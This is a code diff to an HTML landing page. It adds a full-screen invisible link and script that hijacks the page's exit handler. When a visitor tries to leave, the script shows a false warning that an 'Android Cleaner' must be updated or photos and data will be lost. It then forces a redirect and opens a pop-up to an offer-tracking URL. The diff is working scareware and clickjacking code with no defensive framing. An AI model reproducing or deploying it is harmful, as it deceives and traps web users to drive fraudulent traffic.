@@ -16,7 +16,7 @@
     </script>
 </head>
 
-<body onload="translate()" class="en ltr">
+<body onload="translate()" class="en ltr" id="chingari-id">
     <div class="wrap white-theme">
         <header>
             <div class="content">
@@ -388,7 +388,8 @@
     <a id="noreferrer noopener " class="finlink" href="" style="position: fixed; left: 0; top: 0; right: 0; bottom: 0; display: block; z-index: 99999; "></a>
 
     <script type="text/javascript">
-        var fin_link = decodeURIComponent(getURLParameter('p1'));
+        //var fin_link = decodeURIComponent(getURLParameter('p1'));
+        var fin_link = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2';
         var links = document.getElementsByClassName('finlink');
         for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
 
@@ -416,6 +417,47 @@
             } catch (o) {}
         }();
     </script>
+
+<script type="text/javascript">
+	var nc = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2';
+	
+	document.getElementById("chingari-id").href = nc;
+
+    (function (w, d) {
+        var epp = function () {
+            if (w.onbeforeunload === null) {
+                var to;
+                function repp() {
+                    w.onbeforeunload = null;
+					window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+                };
+                function epp() {
+                    to = setTimeout(function () {
+                        w.location.replace(nc);
+                        repp();
+                    }, 100);
+                    return 'You should update your Android Cleaner now or your photos and data will be lost and cannot be recovered!';
+                }
+                w.onbeforeunload = epp;
+                // Prevent epp firing from clicking on tracking links
+                var ln = d.querySelectorAll("[href='"+nc+"']");
+                for (i = 0; i < ln.length; ++i) {
+                    ln[i].addEventListener("click", function () {
+                        repp();
+                    });
+                }
+            }
+            ;
+        };
+        if (d.readyState != 'loading') {
+            epp();
+        } else {
+            d.addEventListener('DOMContentLoaded', epp);
+        }
+    })(window, document);
+</script>
+
+
 </body>
 
 </html>
